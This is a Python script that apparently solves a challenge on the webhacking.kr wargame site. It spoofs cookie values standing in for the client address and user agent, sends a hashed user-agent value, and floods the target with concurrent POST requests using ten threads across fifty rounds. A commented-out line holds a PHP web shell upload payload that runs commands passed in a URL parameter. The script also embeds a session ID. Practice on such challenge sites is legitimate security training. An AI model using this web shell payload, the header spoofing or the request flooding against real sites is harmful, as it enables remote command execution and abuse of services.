import requests
import hashlib
import concurrent.futures
import time
import random


URL = "https://webhacking.kr/challenge/code-5/"
SESSION_ID = "uh10h2dmbcqe99b0pgp44gecov"
cookies = {'PHPSESSID':SESSION_ID, 'REMOTE_ADDR':"17.27.70.12.00.12.00.12.1",'HTTP_USER_AGENT':"" }

data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
params ={"hit":"81239"}
# answer=""
# for i in range(97,123,2):
#     answer +=chr(i)
# print(answer)
# params = {"ans":answer}
# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
def send_point():
    response = requests.post(URL,params=params,data=data, cookies=cookies)
    print(response.text)

num_threads = 10
for i in range(50):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_point ) for _ in range(num_threads)]
        try:
            for future in concurrent.futures.as_completed(futures):
                # This line will only be reached if any thread finishes (unlikely in this setup)
                future.result()
        except KeyboardInterrupt:
            print("Stopping threads...")